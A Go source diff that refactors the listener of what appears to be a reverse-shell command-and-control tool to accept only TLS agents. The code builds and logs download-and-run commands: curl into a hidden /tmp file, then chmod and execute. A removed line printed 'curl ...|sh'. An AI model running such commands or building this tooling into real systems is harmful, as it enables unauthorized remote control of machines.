@@ -33,16 +33,15 @@ type WebSocketMessage struct {
 // Compile-time check: TCPServer implements listener.Listener
 var _ listener.Listener = (*TCPServer)(nil)
 
+// TCPServer is a TLS ingress port where agents dial in.
 type TCPServer struct {
 	Host           string                      `json:"host"`
 	GroupDispatch  bool                        `json:"group_dispatch"`
 	Port           uint16                      `json:"port"`
-	Clients        map[string](*TCPClient)     `json:"clients"`
 	TermiteClients map[string](*TermiteClient) `json:"termite_clients"`
 	TimeStamp      time.Time                   `json:"timestamp"`
 	Interfaces     []string                    `json:"interfaces"`
 	Hash           string                      `json:"hash"`
-	Encrypted      bool                        `json:"encrypted"`
 	DisableHistory bool                        `json:"disable_history"`
 	PublicIP       string                      `json:"public_ip"`
 	ShellPath      string                      `json:"shell_path"`
@@ -50,12 +49,13 @@ type TCPServer struct {
 	stopped        chan struct{}               `json:"-"`
 }
 
-func (s *TCPServer) GetHash() string   { return s.Hash }
-func (s *TCPServer) GetHost() string   { return s.Host }
-func (s *TCPServer) GetPort() uint16   { return s.Port }
-func (s *TCPServer) IsEncrypted() bool { return s.Encrypted }
+func (s *TCPServer) GetHash() string { return s.Hash }
+func (s *TCPServer) GetHost() string { return s.Host }
+func (s *TCPServer) GetPort() uint16 { return s.Port }
 
-func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool, disableHistory bool, PublicIP string, ShellPath string) *TCPServer {
+// CreateTCPServer registers a new TLS listener. Agents dial in with
+// TLS+protobuf; no plain-TCP fallback is accepted.
+func CreateTCPServer(host string, port uint16, hashFormat string, disableHistory bool, PublicIP string, ShellPath string) *TCPServer {
 	service := fmt.Sprintf("%s:%d", host, port)
 
 	if _, ok := Ctx.Servers[hash.MD5(service)]; ok {
@@ -72,14 +72,12 @@ func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool
 		Host:           host,
 		Port:           port,
 		GroupDispatch:  true,
-		Clients:        make(map[string](*TCPClient)),
 		TermiteClients: make(map[string](*TermiteClient)),
 		Interfaces:     []string{},
 		TimeStamp:      time.Now(),
 		hashFormat:     hashFormat,
 		Hash:           hash.MD5(fmt.Sprintf("%s:%d", host, port)),
 		stopped:        make(chan struct{}, 1),
-		Encrypted:      encrypted,
 		DisableHistory: disableHistory,
 		PublicIP:       PublicIP,
 		ShellPath:      ShellPath,
@@ -90,12 +88,10 @@ func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool
 	// Gather listening interfaces
 	tcpServer.Interfaces = network.GatherInterfacesList(tcpServer.Host)
 
-	// Support for distributor for termite
-	if encrypted {
-		for _, ifaddr := range tcpServer.Interfaces {
-			routeKey := str.RandomString(0x08)
-			Ctx.Distributor.(*Distributor).Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
-		}
+	// Distributor route so the agent binary download URL can address this listener
+	for _, ifaddr := range tcpServer.Interfaces {
+		routeKey := str.RandomString(0x08)
+		Ctx.Distributor.(*Distributor).Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
 	}
 
 	// Fetch real public IP address if not specified
@@ -121,71 +117,55 @@ func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool
 
 	// Try to check
 	log.Info("Trying to create server on: %s", service)
-	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
-	if err != nil {
+	if _, err := net.ResolveTCPAddr("tcp4", service); err != nil {
 		log.Error("Resolve TCP address failed: %s", err)
 		DeleteServer(tcpServer)
 		return nil
 	}
 
-	listener, err := net.ListenTCP("tcp", tcpAddr)
+	probe, err := net.Listen("tcp", service)
 	if err != nil {
 		log.Error("Listen failed: %s", err)
 		DeleteServer(tcpServer)
 		return nil
-	} else {
-		listener.Close()
 	}
+	probe.Close()
 
 	return tcpServer
 }
 
 func (s *TCPServer) Handle(conn net.Conn) {
-	if s.Encrypted {
-		client := CreateTermiteClient(conn, s, s.DisableHistory)
-		// Send gather info request
-		log.Info("Gathering information from client...")
-		if client.GatherClientInfo(s.hashFormat) {
-			log.Info("A new encrypted termite (%s) income connection from %s", client.Version, client.conn.RemoteAddr())
-			s.AddTermiteClient(client)
-		} else {
-			log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
-			client.Close()
-		}
+	client := CreateTermiteClient(conn, s, s.DisableHistory)
+	log.Info("Gathering information from client...")
+	if client.GatherClientInfo(s.hashFormat) {
+		log.Info("A new encrypted termite (%s) income connection from %s", client.Version, client.conn.RemoteAddr())
+		s.AddTermiteClient(client)
 	} else {
-		client := CreateTCPClient(conn, s)
-		log.Info("A new income connection from %s", client.conn.RemoteAddr())
-		s.AddTCPClient(client)
+		log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
+		client.Close()
 	}
 }
 
 func (s *TCPServer) Run() {
 	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
-	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
 
-	var listener net.Listener
-	if s.Encrypted {
-		certBuilder := new(strings.Builder)
-		keyBuilder := new(strings.Builder)
-		crypto.Generate(certBuilder, keyBuilder)
+	certBuilder := new(strings.Builder)
+	keyBuilder := new(strings.Builder)
+	crypto.Generate(certBuilder, keyBuilder)
 
-		pemContent := []byte(fmt.Sprint(certBuilder))
-		keyContent := []byte(fmt.Sprint(keyBuilder))
+	pemContent := []byte(fmt.Sprint(certBuilder))
+	keyContent := []byte(fmt.Sprint(keyBuilder))
 
-		cert, err := tls.X509KeyPair(pemContent, keyContent)
-
-		if err != nil {
-			log.Error("Encrypted server failed to loadkeys: %s", err)
-			DeleteServer(s)
-			return
-		}
-		config := tls.Config{Certificates: []tls.Certificate{cert}}
-		config.Rand = rand.Reader
-		listener, err = tls.Listen("tcp", service, &config)
-	} else {
-		listener, err = net.ListenTCP("tcp", tcpAddr)
+	cert, err := tls.X509KeyPair(pemContent, keyContent)
+	if err != nil {
+		log.Error("Listener failed to load keys: %s", err)
+		DeleteServer(s)
+		return
 	}
+	tlsConfig := tls.Config{Certificates: []tls.Certificate{cert}}
+	tlsConfig.Rand = rand.Reader
 
+	ln, err := tls.Listen("tcp", service, &tlsConfig)
 	if err != nil {
 		log.Error("Listen failed: %s", err)
 		DeleteServer(s)
@@ -193,31 +173,24 @@ func (s *TCPServer) Run() {
 	}
 	log.Info("Server running at: %s", s.FullDesc())
 
-	if s.Encrypted {
-		for _, ifname := range s.Interfaces {
-			listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
-			log.Warn("Connect back to: %s", listenerHostPort)
-			for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
-				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
-				filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
-				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
-				log.Warn("\t`%s`", command)
-			}
-		}
-	} else {
-		for _, ifname := range s.Interfaces {
-			log.Warn("\t`curl http://%s:%d/|sh`", ifname, s.Port)
+	for _, ifname := range s.Interfaces {
+		listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
+		log.Warn("Agents should dial: %s", listenerHostPort)
+		for _, ifaddr := range Ctx.Distributor.(*Distributor).Interfaces {
+			distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.(*Distributor).Port)
+			filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
+			command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && " + filename
+			log.Warn("\t`%s`", command)
 		}
 	}
 
 	for {
 		select {
 		case <-s.stopped:
-			listener.Close()
+			ln.Close()
 			return
 		default:
-			var err error
-			conn, err := listener.Accept()
+			conn, err := ln.Accept()
 			if err != nil {
 				continue
 			}
@@ -227,31 +200,18 @@ func (s *TCPServer) Run() {
 }
 
 func (s *TCPServer) AsTable() {
-	if len(s.Clients) > 0 || len(s.TermiteClients) > 0 {
+	if len(s.TermiteClients) > 0 {
 		t := table.NewWriter()
 		t.SetOutputMirror(os.Stdout)
 		t.SetTitle(fmt.Sprintf(
 			"%s is listening on %s:%d, %d clients",
 			s.Hash,
-			(*s).Host,
-			(*s).Port,
-			len((*s).Clients)+len((*s).TermiteClients),
+			s.Host,
+			s.Port,
+			len(s.TermiteClients),
 		))
 
 		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Python", "Time", "Alias", "GroupDispatch"})
-
-		for chash, client := range s.Clients {
-			t.AppendRow([]interface{}{
-				chash,
-				client.conn.RemoteAddr().String(),
-				client.OS.String(),
-				client.User,
-				client.Python2 != "" || client.Python3 != "",
-				humanize.Time(client.TimeStamp),
-				client.Alias,
-				client.GroupDispatch,
-			})
-		}
 
 		for chash, client := range s.TermiteClients {
 			t.AppendRow([]interface{}{
@@ -268,10 +228,10 @@ func (s *TCPServer) AsTable() {
 
 		t.Render()
 		log.Success("%s is listening on %s:%d, %d clients listed",
-			s.Hash, (*s).Host, (*s).Port, len((*s).Clients)+len((*s).TermiteClients))
+			s.Hash, s.Host, s.Port, len(s.TermiteClients))
 	} else {
 		log.Warn("[%s] is listening on %s:%d, 0 clients",
-			s.Hash, (*s).Host, (*s).Port)
+			s.Hash, s.Host, s.Port)
 	}
 }
 
@@ -282,7 +242,7 @@ func (s *TCPServer) OnelineDesc() string {
 			"%s:%d (%d online clients)",
 			s.Host,
 			s.Port,
-			len(s.Clients),
+			len(s.TermiteClients),
 		),
 	)
 	return buffer.String()
@@ -296,12 +256,12 @@ func (s *TCPServer) FullDesc() string {
 			s.Hash,
 			s.Host,
 			s.Port,
-			len(s.Clients),
+			len(s.TermiteClients),
 			humanize.Time(s.TimeStamp),
 		),
 	)
 	var descs []string
-	for _, client := range s.Clients {
+	for _, client := range s.TermiteClients {
 		descs = append(descs, fmt.Sprintf("\t%s", client.FullDesc()))
 	}
 	if len(descs) > 0 {
@@ -315,8 +275,8 @@ func (s *TCPServer) Stop() {
 	log.Info("Stopping server: %s", s.OnelineDesc())
 	s.stopped <- struct{}{}
 
-	for _, client := range s.Clients {
-		s.DeleteTCPClient(client)
+	for _, client := range s.TermiteClients {
+		s.DeleteTermiteClient(client)
 	}
 }
 
@@ -327,67 +287,6 @@ const (
 	CLIENT_DUPLICATED
 	SERVER_DUPLICATED
 )
-
-func (s *TCPServer) NotifyWebSocketDuplicateTCPClient(client *TCPClient) {
-	// WebSocket Broadcast
-	type ClientDuplicateMessage struct {
-		Client     TCPClient
-		ServerHash string
-	}
-	msg, _ := json.Marshal(WebSocketMessage{
-		Type: CLIENT_DUPLICATED,
-		Data: ClientDuplicateMessage{
-			Client:     *client,
-			ServerHash: s.Hash,
-		},
-	})
-	// Notify to all websocket clients
-	if Ctx.NotifyWebSocket != nil {
-		Ctx.NotifyWebSocket.Broadcast(msg)
-	}
-}
-
-func (s *TCPServer) NotifyWebSocketOnlineTCPClient(client *TCPClient) {
-	// WebSocket Broadcast
-	type ClientOnlineMessage struct {
-		Client     TCPClient
-		ServerHash string
-	}
-	msg, _ := json.Marshal(WebSocketMessage{
-		Type: CLIENT_CONNECTED,
-		Data: ClientOnlineMessage{
-			Client:     *client,
-			ServerHash: s.Hash,
-		},
-	})
-	// Notify to all websocket clients
-	if Ctx.NotifyWebSocket != nil {
-		Ctx.NotifyWebSocket.Broadcast(msg)
-	}
-}
-
-func (s *TCPServer) AddTCPClient(client *TCPClient) {
-	client.GroupDispatch = s.GroupDispatch
-	client.GatherClientInfo(s.hashFormat)
-	if _, exists := s.Clients[client.Hash]; exists {
-		log.Error("Duplicated income connection detected!")
-		s.NotifyWebSocketDuplicateTCPClient(client)
-		client.Close()
-	} else {
-		log.Success("Fire in the hole: %s", client.OnelineDesc())
-		s.Clients[client.Hash] = client
-		s.NotifyWebSocketOnlineTCPClient(client)
-	}
-}
-
-func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
-	delete(s.Clients, client.Hash)
-	client.Close()
-}
-
-func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
-	return s.Clients
-}
 
 func (s *TCPServer) NotifyWebSocketDuplicateTermiteClient(client *TermiteClient) {
 	// WebSocket Broadcast
